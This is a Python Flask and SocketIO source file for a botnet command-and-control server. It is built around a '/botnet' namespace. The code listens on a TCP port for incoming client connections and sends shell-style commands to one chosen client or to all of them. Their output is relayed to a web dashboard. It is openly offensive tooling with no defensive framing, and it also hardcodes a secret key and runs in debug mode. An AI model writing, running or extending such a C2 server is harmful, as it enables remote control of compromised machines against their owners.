import this
from flask import *
from flask import Flask,  render_template
from flask_socketio import SocketIO, emit, disconnect
from threading import Lock, Event
import os
import socket, sys, time, threading
#from termcolor import colored

async_mode = None
app = Flask(__name__)
app.config['SECRET_KEY'] = '5dec1cfe7c0c2ec55c17fb44b43f7d14'
socket_ = SocketIO(app, async_mode=async_mode)

parseThread = None
parse_thread_lock = Lock()
startserverThread = None
start_server_thread_lock2 = Lock()

event= Event()


clients=[]

def client_handler():
    global clients
    while True:
        i=0
        curr = int(input(f"Please specify client ~ range(0 - {len(clients)-1}) - (Enter -1 to send command to all clients at once): "))
        command = str(input(f"Enter Instruction: "))
        if curr == -1:
            for conn, adrress in clients:
                conn.send((command+"\n").encode())
                conn.settimeout(1)
                try:
                    reply = conn.recv(4096).decode()
                    print(f"\n\t\t ---------------------- Client [{clients[i][1][0]}] : [{clients[i][1][1]}]'s Output --------------------------------\n\n")
                    reply=reply.splitlines()
                    socket_.emit('printer', {'data':f'\n--- Client [{clients[i][1][0]}] : [{clients[i][1][1]}]\'s Output ---'}, namespace='/botnet')
                    for line in reply:
                        socket_.emit('printer', {'data':line}, namespace='/botnet')
                        print(colored(line, 'green')); i+=1
                except socket.timeout:
                    continue
        else:
            clients[curr][0].send((command+"\n").encode())
            clients[curr][0].settimeout(1)
            try:
                reply = clients[curr][0].recv(4096).decode()
                print(f"\n\t\t ---------------------- Client [{clients[curr][1][0]}] : [{clients[curr][1][1]}]'s Output --------------------------------\n\n")
                reply = reply.split("\n")
                socket_.emit('printer', {'data':f'\n--- Client [{clients[curr][1][0]}] : [{clients[curr][1][1]}]\'s Output ---'}, namespace='/botnet')
                for line in reply:
                    socket_.emit('printer', {'data':f'\n{line}'}, namespace='/botnet')
                    print(colored(line, 'green'))
            except socket.timeout:
                continue
                
def listen(ip, port):
    global clients
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen()
    print(f"[+] - Server Listening on Port [{ip}] : [{port}]")
    socket_.emit('printer', {'data':f'[+] - Server Listening on Port [{ip}] : [{port}]'}, namespace='/botnet')
    #thread = threading.Thread(target = client_handler).start()
    ans = ''
    while True:
        (conn,address) = s.accept()
        clients.append((conn, address))
        c=[]
        for _, addr in clients:
            c.append(str(addr))
        socket_.emit("connected_clients", {'data':c}, namespace="/botnet")
        print('C: ',c)
        print(f"\n[+] - Server Conneted to client at [{address[0]} ] : [ {address[1]}]")
        socket_.emit('printer', {'data':f'\n[+] - Server Conneted to client at [{address[0]} ] : [ {address[1]}]'}, namespace='/botnet')



def printAll(path):
    print("\n Priniting values recieved from the front end")
    print("Path: ", path)
    '''print("Algorithm: ", algo)
    print("Match: ", match)
    print("TEST: ", anything)'''

@app.route('/')
def index():
    return render_template('index.html', async_mode=socket_.async_mode)

@socket_.on("sendMessage", namespace='/botnet')
def sendMessage(data):
    global clients
    message=data['data']
    if message['client'] == 'All':
        print("Clients length: ", len(clients))
        i = 0
        for conn, addr in clients:
            conn.send((message['message']+"\n").encode())
            conn.settimeout(1)
            try:
                d=conn.recv(4096).decode()
                d=d.splitlines()
                print(f"\n --- Client [{clients[i][1][0]}] : [{clients[i][1][1]}]'s Output ---\n")
                emit('printer', {'data': f"\n --- Client [{clients[i][1][0]}] : [{clients[i][1][1]}]'s Output ---\n"});i+=1
                for line in d:
                    emit('printer', {'data':line}, namespace='/botnet')
            except socket.timeout:
                print("hello")
            conn.settimeout(0)
    else:
        newstr = message['client']
        getres = int(newstr[len(newstr)-1])

        clients[getres][0].send((message['message']+"\n").encode())
        clients[getres][0].settimeout(1)
        try:
            d=clients[getres][0].recv(4096).decode()
            d=d.splitlines()
            emit('printer', {'data': f"\n --- Client: {str(clients[getres][1])} ---"})
            for line in d:
                emit('printer', {'data':line}, namespace='/botnet')
        except socket.timeout:
            print("hello")
        clients[getres][0].settimeout(0)

@socket_.on('parse', namespace='/botnet')
def parse(data):
    message = data['data']
    global parseThread
    with parse_thread_lock:
        if parseThread is None:
            ip = message['IP']
            port = message['Port']
            parseThread = socket_.start_background_task(listen, ip, int(port))
            emit('logging', {'data': 'Started parsing'})
        else:
            emit('logging', {'data': 'Process already running'})


if __name__ == '__main__':
    socket_.run(app, debug=True)
